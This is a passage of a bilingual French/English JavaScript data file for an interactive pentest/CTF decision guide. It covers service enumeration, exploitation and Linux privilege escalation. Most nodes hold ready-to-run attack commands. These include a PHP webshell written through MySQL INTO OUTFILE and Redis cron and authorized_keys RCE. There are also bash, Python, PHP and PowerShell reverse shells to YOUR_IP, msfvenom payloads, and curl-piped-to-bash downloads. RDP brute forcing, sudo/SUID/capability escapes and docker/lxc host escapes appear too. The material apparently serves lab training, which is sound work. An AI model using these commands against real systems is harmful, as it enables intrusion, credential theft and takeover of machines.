      { label: "Lire fichiers système (si FILE privilege)", label_en: "Read system files (if FILE privilege)", cmd: "SELECT LOAD_FILE('/etc/passwd');\nSELECT LOAD_FILE('/var/www/html/config.php');" },
      { label: "Écrire un webshell", label_en: "Write a webshell", cmd: "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';" }
    ],
    lookfor: ["Connexion sans password", "Utilisateurs MySQL avec mots de passe faibles", "FILE privilege disponible"],
    lookfor_en: ["Connection without password", "MySQL users with weak passwords", "FILE privilege available"],
    tips: ["Si connexion possible → LOAD_FILE et INTO OUTFILE pour pivoter vers RCE"],
    tips_en: ["If connection is possible → LOAD_FILE and INTO OUTFILE to pivot to RCE"],
    choices: [
      { label: "Connexion réussie → webshell via INTO OUTFILE", label_en: "Connection successful → webshell via INTO OUTFILE", next: "rce_found", icon: "💥" },
      { label: "Credentials trouvés dans MySQL", label_en: "Credentials found in MySQL", next: "credentials_found", icon: "🏆" },
      { label: "Hashes MySQL trouvés", label_en: "MySQL hashes found", next: "password_crack", icon: "🔓" }
    ]
  },

  "redis_enum": {
    id: "redis_enum", title: "Redis Énumération", title_en: "Redis Enumeration", category: "network", icon: "🔴",
    description: "Redis sans authentification → lecture/écriture de données, parfois RCE.",
    description_en: "Redis without authentication → read/write data, sometimes RCE.",
    commands: [
      { label: "Connexion Redis", label_en: "Redis connection", cmd: "redis-cli -h TARGET_IP\n> ping\n> info" },
      { label: "Lister toutes les clés", label_en: "List all keys", cmd: "redis-cli -h TARGET_IP keys '*'" },
      { label: "Lire une valeur", label_en: "Read a value", cmd: "redis-cli -h TARGET_IP get KEY_NAME" },
      { label: "RCE via cron job", label_en: "RCE via cron job", cmd: "redis-cli -h TARGET_IP\n> config set dir /var/spool/cron/crontabs/\n> config set dbfilename root\n> set x \"\\n* * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\\n\"\n> save" },
      { label: "RCE via SSH authorized_keys", label_en: "RCE via SSH authorized_keys", cmd: "redis-cli -h TARGET_IP\n> config set dir /root/.ssh/\n> config set dbfilename authorized_keys\n> set x \"\\nSS_PUBLIC_KEY\\n\"\n> save" }
    ],
    lookfor: ["Authentification désactivée (très courant)", "Version Redis", "Répertoire de travail (config get dir)"],
    lookfor_en: ["Authentication disabled (very common)", "Redis version", "Working directory (config get dir)"],
    tips: ["Redis < 5.0.5 avec RESP2 → module injection pour RCE (CVE-2019-10214)"],
    tips_en: ["Redis < 5.0.5 with RESP2 → module injection for RCE (CVE-2019-10214)"],
    choices: [
      { label: "RCE via cron ou SSH obtenu", label_en: "RCE via cron or SSH obtained", next: "rce_found", icon: "💥" },
      { label: "Données sensibles dans les clés", label_en: "Sensitive data in the keys", next: "credentials_found", icon: "🏆" }
    ]
  },

  "mongodb_enum": {
    id: "mongodb_enum", title: "MongoDB Énumération", title_en: "MongoDB Enumeration", category: "network", icon: "🍃",
    description: "MongoDB sans authentification → lecture de toutes les collections.",
    description_en: "MongoDB without authentication → read all collections.",
    commands: [
      { label: "Connexion MongoDB", label_en: "MongoDB connection", cmd: "mongo TARGET_IP\n> show dbs\n> use DATABASE\n> show collections\n> db.COLLECTION.find()" },
      { label: "Avec mongosh", label_en: "With mongosh", cmd: "mongosh TARGET_IP:27017\n> show dbs" },
      { label: "Dump complet", label_en: "Full dump", cmd: "mongodump --host TARGET_IP --out ./mongo_dump" }
    ],
    lookfor: ["Collection users avec mots de passe", "Tokens de session", "Données de l'application"],
    lookfor_en: ["Users collection with passwords", "Session tokens", "Application data"],
    tips: ["MongoDB sans auth = toutes les données lisibles et modifiables"],
    tips_en: ["MongoDB without auth = all data readable and writable"],
    choices: [
      { label: "Credentials trouvés dans les collections", label_en: "Credentials found in collections", next: "credentials_found", icon: "🏆" }
    ]
  },

  "rdp_enum": {
    id: "rdp_enum", title: "RDP Énumération", title_en: "RDP Enumeration", category: "network", icon: "🖥️",
    description: "Remote Desktop Protocol — version, vulnérabilités, credentials.",
    description_en: "Remote Desktop Protocol — version, vulnerabilities, credentials.",
    commands: [
      { label: "Nmap scripts RDP", label_en: "Nmap RDP scripts", cmd: "nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 TARGET_IP" },
      { label: "Tester BlueKeep (CVE-2019-0708)", label_en: "Test BlueKeep (CVE-2019-0708)", cmd: "msfconsole\nuse auxiliary/scanner/rdp/cve_2019_0708_bluekeep\nset RHOSTS TARGET_IP\nrun" },
      { label: "Connexion RDP avec credentials", label_en: "RDP connection with credentials", cmd: "xfreerdp /v:TARGET_IP /u:USERNAME /p:PASSWORD /cert-ignore" },
      { label: "Brute force RDP", label_en: "RDP brute force", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://TARGET_IP" }
    ],
    lookfor: ["Windows 7/2008 → potentiellement BlueKeep", "NLA activé ou non"],
    lookfor_en: ["Windows 7/2008 → potentially BlueKeep", "NLA enabled or not"],
    tips: ["BlueKeep = crash kernel souvent → instable. Préférer credentials si disponibles"],
    tips_en: ["BlueKeep = often crashes kernel → unstable. Prefer credentials if available"],
    choices: [
      { label: "Credentials fonctionnent → connexion RDP", label_en: "Credentials work → RDP connection", next: "privesc_windows", icon: "🖥️" },
      { label: "BlueKeep exploitable", label_en: "BlueKeep exploitable", next: "exploit_searchsploit", icon: "💥" }
    ]
  },

  "multi_service": {
    id: "multi_service", title: "Ports Inconnus / Service Inhabituel", title_en: "Unknown Ports / Unusual Service", category: "network", icon: "🔍",
    description: "Identifier et interagir avec des services non-standard.",
    description_en: "Identify and interact with non-standard services.",
    commands: [
      { label: "Banner grabbing", label_en: "Banner grabbing", cmd: "nc -nv TARGET_IP PORT\ncurl TARGET_IP:PORT\ntelnet TARGET_IP PORT" },
      { label: "Nmap service detection ciblé", label_en: "Targeted Nmap service detection", cmd: "nmap -sV -sC -p PORT --version-intensity 9 TARGET_IP" },
      { label: "Chercher exploit pour service identifié", label_en: "Search exploit for identified service", cmd: "searchsploit SERVICE_NAME VERSION" },
      { label: "Wireshark / tcpdump pour analyser protocole", label_en: "Wireshark / tcpdump to analyze protocol", cmd: "sudo tcpdump -i tun0 host TARGET_IP -w capture.pcap" }
    ],
    lookfor: ["Banner d'identification du service et version", "Protocole propriétaire ou connu"],
    lookfor_en: ["Service identification banner and version", "Proprietary or known protocol"],
    tips: ["Shodan.io : rechercher le banner pour identifier le service"],
    tips_en: ["Shodan.io: search the banner to identify the service"],
    choices: [
      { label: "Service identifié → exploitation", label_en: "Service identified → exploitation", next: "exploit_searchsploit", icon: "💥" }
    ]
  },

  "no_open_ports": {
    id: "no_open_ports", title: "Aucun Port Ouvert", title_en: "No Open Ports", category: "recon", icon: "🚫",
    description: "Le scan ne montre rien — firewall, mauvaise IP, ou scan incomplet.",
    description_en: "The scan shows nothing — firewall, wrong IP, or incomplete scan.",
    commands: [
      { label: "Vérifier l'IP cible", label_en: "Verify the target IP", cmd: "ping TARGET_IP\ntraceroute TARGET_IP" },
      { label: "Scan avec -Pn (ignorer ping)", label_en: "Scan with -Pn (skip ping)", cmd: "nmap -Pn -sV -p- --min-rate 1000 TARGET_IP" },
      { label: "Scan TCP SYN vs Full connect", label_en: "TCP SYN vs Full connect scan", cmd: "sudo nmap -sS -Pn -p- TARGET_IP\nnmap -sT -Pn -p- TARGET_IP" },
      { label: "Vérifier UDP", label_en: "Check UDP", cmd: "sudo nmap -sU --top-ports 50 -Pn TARGET_IP" },
      { label: "Masscan ultra-rapide", label_en: "Masscan ultra-fast", cmd: "sudo masscan TARGET_IP -p0-65535 --rate=1000" }
    ],
    lookfor: ["Firewall filtrant vs port vraiment fermé", "Réponse ICMP"],
    lookfor_en: ["Filtering firewall vs truly closed port", "ICMP response"],
    tips: ["CTF : vérifier le bon VPN/réseau. La machine est-elle démarrée ?"],
    tips_en: ["CTF: check you are on the right VPN/network. Is the machine started?"],
    choices: [
      { label: "Ports trouvés après scan plus poussé", label_en: "Ports found after deeper scan", next: "start", icon: "🎯" }
    ]
  },

  // ─── EXPLOITATION ─────────────────────────────────────────────────────────

  "exploit_searchsploit": {
    id: "exploit_searchsploit", title: "Exploitation via Searchsploit / Metasploit", title_en: "Exploitation via Searchsploit / Metasploit", category: "exploit", icon: "💥",
    description: "Utiliser une CVE connue pour le service identifié.",
    description_en: "Use a known CVE for the identified service.",
    commands: [
      { label: "Chercher des exploits", label_en: "Search for exploits", cmd: "searchsploit SERVICE VERSION\n# Ex: searchsploit apache 2.4.49" },
      { label: "Copier l'exploit", label_en: "Copy the exploit", cmd: "searchsploit -m EXPLOIT_ID\n# Examiner le code avant d'exécuter !" },
      { label: "Chercher dans Metasploit", label_en: "Search in Metasploit", cmd: "msfconsole\nsearch type:exploit name:SERVICE\nuse MODULE_PATH\nshow options\nset RHOSTS TARGET_IP\nset LHOST YOUR_IP\nrun" },
      { label: "Chercher sur GitHub", label_en: "Search on GitHub", cmd: "# google : CVE-2021-XXXXX PoC github\n# exploit-db.com" }
    ],
    lookfor: ["Type d'exploit : Remote vs Local, Authenticated vs Unauthenticated", "Fiabilité et notes de l'exploit"],
    lookfor_en: ["Exploit type: Remote vs Local, Authenticated vs Unauthenticated", "Exploit reliability and notes"],
    tips: [
      "Lire le code de l'exploit avant de l'exécuter — adapter IP/port",
      "Si Python 2 → adapter en Python 3 ou utiliser python2",
      "Metasploit est plus fiable pour les exploits complexes"
    ],
    tips_en: [
      "Read the exploit code before running it — adjust IP/port",
      "If Python 2 → adapt to Python 3 or use python2",
      "Metasploit is more reliable for complex exploits"
    ],
    choices: [
      { label: "Exploit réussi → RCE obtenu", label_en: "Exploit successful → RCE obtained", next: "rce_found", icon: "💥" },
      { label: "Exploit échoue — essayer variantes", label_en: "Exploit fails — try variants", next: "rce_found", icon: "🔄" }
    ]
  },

  "rce_found": {
    id: "rce_found", title: "RCE Confirmé — Obtenir un Reverse Shell", title_en: "RCE Confirmed — Get a Reverse Shell", category: "exploit", icon: "🖥️",
    description: "Exécution de code à distance confirmée. Établir un shell interactif stable.",
    description_en: "Remote code execution confirmed. Establish a stable interactive shell.",
    commands: [
      { label: "Préparer listener", label_en: "Set up listener", cmd: "nc -lvnp 4444\n# Ou avec rlwrap pour historique : rlwrap nc -lvnp 4444" },
      { label: "Reverse shell Bash", label_en: "Bash reverse shell", cmd: "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" },
      { label: "Reverse shell Python", label_en: "Python reverse shell", cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
      { label: "Reverse shell PHP", label_en: "PHP reverse shell", cmd: "php -r '$sock=fsockopen(\"YOUR_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
      { label: "Reverse shell PowerShell", label_en: "PowerShell reverse shell", cmd: "powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" },
      { label: "msfvenom payload", label_en: "msfvenom payload", cmd: "# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe" },
      { label: "Revshells.com — générateur en ligne", label_en: "Revshells.com — online generator", cmd: "# https://www.revshells.com/ — tous les formats possibles" }
    ],
    lookfor: ["Connexion entrante sur votre listener nc", "Prompt shell affiché"],
    lookfor_en: ["Incoming connection on your nc listener", "Shell prompt displayed"],
    tips: [
      "Si bash bloqué → essayer sh, nc, python, perl, ruby",
      "Port 443 ou 80 souvent moins bloqué par firewall sortant",
      "msfvenom pour des payloads encodés si l'AV bloque"
    ],
    tips_en: [
      "If bash is blocked → try sh, nc, python, perl, ruby",
      "Port 443 or 80 is often less blocked by outbound firewalls",
      "msfvenom for encoded payloads if AV blocks them"
    ],
    choices: [
      { label: "Shell obtenu (Linux)", label_en: "Shell obtained (Linux)", next: "shell_stabilize", icon: "🐧" },
      { label: "Shell obtenu (Windows)", label_en: "Shell obtained (Windows)", next: "shell_windows", icon: "🪟" }
    ]
  },

  "shell_stabilize": {
    id: "shell_stabilize", title: "Stabiliser le Shell Linux", title_en: "Stabilize the Linux Shell", category: "exploit", icon: "🐧",
    description: "Un reverse shell basique est instable. Le rendre interactif avec PTY.",
    description_en: "A basic reverse shell is unstable. Make it interactive with PTY.",
    commands: [
      { label: "Méthode Python PTY (meilleure)", label_en: "Python PTY method (best)", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Puis : Ctrl+Z\nstty raw -echo; fg\n# Puis dans le shell :\nexport TERM=xterm" },
      { label: "Alternative avec script", label_en: "Alternative with script", cmd: "script /dev/null -c bash\n# Ctrl+Z, stty raw -echo, fg" },
      { label: "Ajuster la taille du terminal", label_en: "Adjust terminal size", cmd: "# Sur votre machine :\nstty size  # note les valeurs rows cols\n# Dans le reverse shell :\nstty rows 38 cols 116" },
      { label: "Upgrade vers SSH si possible", label_en: "Upgrade to SSH if possible", cmd: "# Sur la cible, générer clé et ajouter au authorized_keys\nssh-keygen\ncat id_rsa.pub >> ~/.ssh/authorized_keys\n# Récupérer id_rsa et se connecter en SSH" }
    ],
    lookfor: ["Shell interactif avec Ctrl+C qui ne tue pas le shell", "Tab completion fonctionnel"],
    lookfor_en: ["Interactive shell where Ctrl+C does not kill the shell", "Tab completion working"],
    tips: ["Sans stabilisation : Ctrl+C tue le shell. Toujours stabiliser avant tout"],
    tips_en: ["Without stabilization: Ctrl+C kills the shell. Always stabilize before anything else"],
    choices: [
      { label: "Shell stabilisé — passer à la reconnaissance locale", label_en: "Shell stabilized — move to local enumeration", next: "privesc_linux_enum", icon: "🔍" }
    ]
  },

  "shell_windows": {
    id: "shell_windows", title: "Shell Windows — Premières Actions", title_en: "Windows Shell — First Steps", category: "exploit", icon: "🪟",
    description: "Shell Windows obtenu. Reconnaissance et prochaines étapes.",
    description_en: "Windows shell obtained. Reconnaissance and next steps.",
    commands: [
      { label: "Informations système", label_en: "System information", cmd: "whoami\nsysteminfo\nwhoami /priv\nnet user\nnet localgroup administrators" },
      { label: "Upgrade vers Meterpreter", label_en: "Upgrade to Meterpreter", cmd: "# Dans msfconsole, après shell basique :\nCtrl+Z\nsessions -u SESSION_ID" },
      { label: "Upgrade vers PowerShell", label_en: "Upgrade to PowerShell", cmd: "powershell -ep bypass" },
      { label: "Chercher flags rapidement", label_en: "Quickly look for flags", cmd: "dir C:\\Users\\*\\Desktop\\* /s\ntype C:\\Users\\USER\\Desktop\\user.txt" }
    ],
    lookfor: ["Niveau de privilèges : user vs SYSTEM vs Administrator", "SeImpersonatePrivilege ou SeAssignPrimaryToken activés"],
    lookfor_en: ["Privilege level: user vs SYSTEM vs Administrator", "SeImpersonatePrivilege or SeAssignPrimaryToken enabled"],
    tips: ["whoami /priv : si SeImpersonatePrivilege → Juicy/Sweet Potato pour SYSTEM"],
    tips_en: ["whoami /priv: if SeImpersonatePrivilege → Juicy/Sweet Potato for SYSTEM"],
    choices: [
      { label: "Déjà SYSTEM ou Administrator", label_en: "Already SYSTEM or Administrator", next: "privesc_windows_post", icon: "👑" },
      { label: "User standard → escalade de privilèges", label_en: "Standard user → privilege escalation", next: "privesc_windows", icon: "⬆️" }
    ]
  },

  "credentials_found": {
    id: "credentials_found", title: "Credentials Trouvés — Les Tester Partout", title_en: "Credentials Found — Test Everywhere", category: "exploit", icon: "🏆",
    description: "Credentials obtenus. Les password reuse sont très courants — tester sur tous les services.",
    description_en: "Credentials obtained. Password reuse is very common — test against all services.",
    commands: [
      { label: "Tester SSH", label_en: "Test SSH", cmd: "ssh USER@TARGET_IP" },
      { label: "Tester sur tous les services", label_en: "Test against all services", cmd: "crackmapexec smb TARGET_IP -u USER -p PASSWORD\ncrackmapexec ssh TARGET_IP -u USER -p PASSWORD\ncrackmapexec winrm TARGET_IP -u USER -p PASSWORD" },
      { label: "Tester sur l'interface web", label_en: "Test on the web interface", cmd: "# Se connecter sur tous les login forms trouvés" },
      { label: "Chercher d'autres services avec les creds", label_en: "Try creds on other services", cmd: "# Su vers d'autres utilisateurs si sur Linux :\nsu - OTHER_USER\n# Utiliser pour MySQL, FTP, etc." }
    ],
    lookfor: ["Password reuse entre services", "Accès à des services précédemment inaccessibles"],
    lookfor_en: ["Password reuse across services", "Access to previously inaccessible services"],
    tips: ["CTF : les credentials fonctionnent souvent sur plusieurs services par conception"],
    tips_en: ["CTF: credentials often work on multiple services by design"],
    choices: [
      { label: "SSH accès obtenu", label_en: "SSH access obtained", next: "shell_stabilize", icon: "🔐" },
      { label: "Accès web admin obtenu", label_en: "Web admin access obtained", next: "web_authenticated", icon: "🌐" },
      { label: "SMB/WinRM accès obtenu", label_en: "SMB/WinRM access obtained", next: "smb_authenticated", icon: "🪟" },
      { label: "Accès local sur la machine (su - user)", label_en: "Local access on the machine (su - user)", next: "privesc_linux_enum", icon: "🐧" }
    ]
  },

  // ─── PRIVESC LINUX ────────────────────────────────────────────────────────

  "privesc_linux_enum": {
    id: "privesc_linux_enum", title: "PrivEsc Linux — Reconnaissance", title_en: "Linux PrivEsc — Enumeration", category: "privesc", icon: "🔍",
    description: "Cartographier les vecteurs d'escalade de privilèges disponibles.",
    description_en: "Map available privilege escalation vectors.",
    commands: [
      { label: "LinPEAS — outil automatique (recommandé)", label_en: "LinPEAS — automated tool (recommended)", cmd: "# Transférer sur la cible :\ncurl http://YOUR_IP:8000/linpeas.sh | bash\n# Ou :\nwget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh" },
      { label: "Servir linpeas depuis votre machine", label_en: "Serve linpeas from your machine", cmd: "python3 -m http.server 8000  # Dans le dossier où se trouve linpeas.sh" },
      { label: "Vérifications manuelles rapides", label_en: "Quick manual checks", cmd: "sudo -l\nfind / -perm -u=s -type f 2>/dev/null\ncrontab -l && cat /etc/crontab\nenv\ncat /etc/passwd | grep -v nologin" },
      { label: "Capabilities", label_en: "Capabilities", cmd: "getcap -r / 2>/dev/null" },
      { label: "Fichiers world-writable", label_en: "World-writable files", cmd: "find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys" }
    ],
    lookfor: [
      "sudo -l : commandes exécutables sans mot de passe → GTFOBins",
      "Binaires SUID/GUID → GTFOBins",
      "Cron jobs exécutés en root avec scripts modifiables",
      "Capabilities : cap_setuid, cap_net_raw",
      "Variables PATH modifiables"
    ],
    lookfor_en: [
      "sudo -l: commands executable without password → GTFOBins",
      "SUID/GUID binaries → GTFOBins",
      "Cron jobs run as root with writable scripts",
      "Capabilities: cap_setuid, cap_net_raw",
      "Modifiable PATH variables"
    ],
    tips: [
      "GTFOBins.github.io : référence pour SUID, sudo, capabilities",
      "LinPEAS colore en rouge/jaune les vecteurs potentiels",
      "Chercher aussi dans les variables d'environnement : credentials, tokens"
    ],
    tips_en: [
      "GTFOBins.github.io: reference for SUID, sudo, capabilities",
      "LinPEAS colors potential vectors in red/yellow",
      "Also look in environment variables: credentials, tokens"
    ],
    choices: [
      { label: "sudo -l révèle des commandes", label_en: "sudo -l reveals commands", next: "privesc_linux_sudo", icon: "🔧" },
      { label: "Binaire SUID trouvé", label_en: "SUID binary found", next: "privesc_linux_suid", icon: "📌" },
      { label: "Cron job vulnérable", label_en: "Vulnerable cron job", next: "privesc_linux_cron", icon: "⏰" },
      { label: "Capability intéressante trouvée", label_en: "Interesting capability found", next: "privesc_linux_caps", icon: "⚡" },
      { label: "Docker group ou LXC", label_en: "Docker group or LXC", next: "privesc_linux_docker", icon: "🐳" },
      { label: "Version kernel potentiellement vulnérable", label_en: "Potentially vulnerable kernel version", next: "privesc_linux_kernel", icon: "💀" },
      { label: "Credentials dans des fichiers de config", label_en: "Credentials in config files", next: "credentials_found", icon: "🏆" }
    ]
  },

  "privesc_linux_sudo": {
    id: "privesc_linux_sudo", title: "PrivEsc Linux — Sudo", title_en: "Linux PrivEsc — Sudo", category: "privesc", icon: "🔧",
    description: "sudo -l révèle des binaires exécutables en root → GTFOBins pour s'en échapper.",
    description_en: "sudo -l reveals binaries executable as root → GTFOBins to escape them.",
    commands: [
      { label: "Voir les droits sudo", label_en: "Check sudo rights", cmd: "sudo -l" },
      { label: "Exemples GTFOBins courants", label_en: "Common GTFOBins examples", cmd: "# vim\nsudo vim -c ':!/bin/bash'\n# less\nsudo less /etc/passwd  # puis : !bash\n# find\nsudo find . -exec /bin/bash \\; -quit\n# python\nsudo python3 -c 'import os;os.system(\"/bin/bash\")'\n# nmap\nsudo nmap --interactive  # puis : !bash (vieux nmap)\n# awk\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n# perl\nsudo perl -e 'exec \"/bin/bash\";'\n# env\nsudo env /bin/bash" },
      { label: "Script autorisé avec wildcard", label_en: "Allowed script with wildcard", cmd: "# Si sudo /opt/script.sh avec * dans path\n# Créer fichier nommé '-e sh' dans le répertoire\ntouch -- '-e sh'" }
    ],
    lookfor: ["NOPASSWD dans sudo -l", "Binaire listé sur GTFOBins"],
    lookfor_en: ["NOPASSWD in sudo -l", "Binary listed on GTFOBins"],
    tips: [
      "Consulter GTFOBins.github.io pour chaque binaire",
      "sudo ALL = TOUTES les commandes → sudo /bin/bash directement",
      "env_keep avec LD_PRELOAD → escalade via shared library"
    ],
    tips_en: [
      "Check GTFOBins.github.io for each binary",
      "sudo ALL = ALL commands → sudo /bin/bash directly",
      "env_keep with LD_PRELOAD → escalation via shared library"
    ],
    choices: [
      { label: "Root obtenu !", label_en: "Root obtained!", next: "root_obtained", icon: "👑" }
    ]
  },

  "privesc_linux_suid": {
    id: "privesc_linux_suid", title: "PrivEsc Linux — SUID", title_en: "Linux PrivEsc — SUID", category: "privesc", icon: "📌",
    description: "Binaires avec le bit SUID s'exécutent avec les droits du propriétaire (souvent root).",
    description_en: "Binaries with the SUID bit run with the owner's privileges (often root).",
    commands: [
      { label: "Trouver les SUID", label_en: "Find SUID binaries", cmd: "find / -perm -u=s -type f 2>/dev/null" },
      { label: "Chercher sur GTFOBins", label_en: "Search GTFOBins", cmd: "# Pour chaque binaire trouvé : gtfobins.github.io\n# Exemple : /usr/bin/find\nfind . -exec /bin/sh -p \\; -quit" },
      { label: "SUID personnalisé — analyser le binaire", label_en: "Custom SUID — analyze the binary", cmd: "strings /path/to/suid_binary\nltrace /path/to/suid_binary\nstrace /path/to/suid_binary" },
      { label: "PATH hijacking si appel système relatif", label_en: "PATH hijacking if relative system call", cmd: "# Si le binaire appelle 'service' sans chemin absolu\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/service\nchmod +x /tmp/service\n/path/to/suid_binary" }
    ],
    lookfor: [
      "Binaires standards avec SUID non-attendu (cp, vim, python, etc.)",
      "Binaires personnalisés (dans /opt, /home, /usr/local) → analyser avec strings",
      "Appels à d'autres programmes sans chemin absolu → PATH hijacking"
    ],
    lookfor_en: [
      "Standard binaries with unexpected SUID (cp, vim, python, etc.)",
      "Custom binaries (in /opt, /home, /usr/local) → analyze with strings",
      "Calls to other programs without absolute path → PATH hijacking"
    ],
    tips: [
      "strings révèle souvent les commandes appelées",
      "ltrace pour voir les appels de fonctions dynamiques",
      "/bin/bash -p : -p préserve l'EUID root"
    ],
    tips_en: [
      "strings often reveals the called commands",
      "ltrace to see dynamic library function calls",
      "/bin/bash -p: -p preserves the EUID root"
    ],
    choices: [
      { label: "Root obtenu !", label_en: "Root obtained!", next: "root_obtained", icon: "👑" }
    ]
  },

  "privesc_linux_cron": {
    id: "privesc_linux_cron", title: "PrivEsc Linux — Cron Jobs", title_en: "Linux PrivEsc — Cron Jobs", category: "privesc", icon: "⏰",
    description: "Scripts exécutés périodiquement en root. Si modifiables → injection de commandes.",
    description_en: "Scripts periodically executed as root. If writable → command injection.",
    commands: [
      { label: "Voir les cron jobs", label_en: "View cron jobs", cmd: "crontab -l\ncat /etc/crontab\nls -la /etc/cron*\nfind / -name '*.cron' 2>/dev/null" },
      { label: "Surveiller les processus (pspy recommandé)", label_en: "Monitor processes (pspy recommended)", cmd: "# Télécharger pspy sur la cible\nwget http://YOUR_IP:8000/pspy64\nchmod +x pspy64\n./pspy64" },
      { label: "Modifier le script si writable", label_en: "Modify the script if writable", cmd: "echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/script.sh" },
      { label: "Si le script source un fichier modifiable", label_en: "If the script sources a writable file", cmd: "echo 'chmod +s /bin/bash' > /path/to/sourced_file.sh" }
    ],
    lookfor: [
      "Scripts cron exécutés en root avec permissions d'écriture",
      "Wildcard dans commandes tar/rsync (wildcard injection)",
      "Répertoires de scripts modifiables"
    ],
    lookfor_en: [
      "Cron scripts executed as root with write permissions",
      "Wildcards in tar/rsync commands (wildcard injection)",
      "Writable script directories"
    ],
    tips: [
      "pspy est essentiel — révèle les processus et crons sans droits root",
      "Wildcard tar : créer fichiers --checkpoint-action=exec=sh pour RCE",
      "Script dans répertoire writable → remplacer le script entier"
    ],
    tips_en: [
      "pspy is essential — reveals processes and crons without root rights",
      "Wildcard tar: create files --checkpoint-action=exec=sh for RCE",
      "Script in writable directory → replace the entire script"
    ],
    choices: [
      { label: "Root obtenu via cron !", label_en: "Root obtained via cron!", next: "root_obtained", icon: "👑" }
    ]
  },

  "privesc_linux_caps": {
    id: "privesc_linux_caps", title: "PrivEsc Linux — Capabilities", title_en: "Linux PrivEsc — Capabilities", category: "privesc", icon: "⚡",
    description: "Les capabilities Linux donnent des pouvoirs spécifiques à des binaires sans SUID complet.",
    description_en: "Linux capabilities grant specific powers to binaries without full SUID.",
    commands: [
      { label: "Lister les capabilities", label_en: "List capabilities", cmd: "getcap -r / 2>/dev/null" },
      { label: "python3 avec cap_setuid", label_en: "python3 with cap_setuid", cmd: "# Si python3 a cap_setuid+ep :\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" },
      { label: "vim avec cap_setuid", label_en: "vim with cap_setuid", cmd: "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'" },
      { label: "perl avec cap_setuid", label_en: "perl with cap_setuid", cmd: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'" }
    ],
    lookfor: ["cap_setuid, cap_setgid, cap_net_raw, cap_dac_override"],
    lookfor_en: ["cap_setuid, cap_setgid, cap_net_raw, cap_dac_override"],
    tips: ["GTFOBins a une section Capabilities pour chaque binaire"],
    tips_en: ["GTFOBins has a Capabilities section for each binary"],
    choices: [
      { label: "Root obtenu !", label_en: "Root obtained!", next: "root_obtained", icon: "👑" }
    ]
  },

  "privesc_linux_docker": {
    id: "privesc_linux_docker", title: "PrivEsc Linux — Docker / LXC", title_en: "Linux PrivEsc — Docker / LXC", category: "privesc", icon: "🐳",
    description: "Appartenir au groupe docker = root effectif sur la machine hôte.",
    description_en: "Being in the docker group = effective root on the host machine.",
    commands: [
      { label: "Vérifier groupe docker", label_en: "Check docker group", cmd: "id | grep docker\ngroups" },
      { label: "Escape docker via image existante", label_en: "Docker escape via existing image", cmd: "docker images\ndocker run -v /:/mnt --rm -it IMAGE_NAME chroot /mnt sh" },
      { label: "Escape docker si aucune image", label_en: "Docker escape with no existing image", cmd: "docker pull alpine\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
      { label: "LXC escape (groupe lxd)", label_en: "LXC escape (lxd group)", cmd: "# Import image alpine\nlxc image import ./alpine.tar.gz --alias alpine\nlxc init alpine privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/r recursive=true\nlxc start privesc\nlxc exec privesc -- /bin/sh\nchroot /r sh" }
    ],
    lookfor: ["id révèle groupe docker ou lxd/lxc"],
    lookfor_en: ["id reveals docker or lxd/lxc group membership"],
    tips: ["docker run avec -v /:/mnt monte le filesystem hôte → accès total"],
    tips_en: ["docker run with -v /:/mnt mounts the host filesystem → total access"],
    choices: [
      { label: "Root obtenu !", label_en: "Root obtained!", next: "root_obtained", icon: "👑" }
    ]
  },

  "privesc_linux_kernel": {
    id: "privesc_linux_kernel", title: "PrivEsc Linux — Kernel Exploit", title_en: "Linux PrivEsc — Kernel Exploit", category: "privesc", icon: "💀",
    description: "Exploiter une vulnérabilité du noyau Linux pour obtenir root. En dernier recours.",
    description_en: "Exploit a Linux kernel vulnerability to get root. Last resort.",
    commands: [
      { label: "Version du kernel", label_en: "Kernel version", cmd: "uname -r\nuname -a\ncat /proc/version" },
      { label: "Chercher exploits kernel", label_en: "Search kernel exploits", cmd: "searchsploit linux kernel 4.15\n# Linux Exploit Suggester :\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\nbash linux-exploit-suggester.sh" },
      { label: "DirtyCow (CVE-2016-5195) — kernel < 4.8.3", label_en: "DirtyCow (CVE-2016-5195) — kernel < 4.8.3", cmd: "gcc -pthread dirty.c -o dirty -lcrypt\n./dirty PASSWORD" },
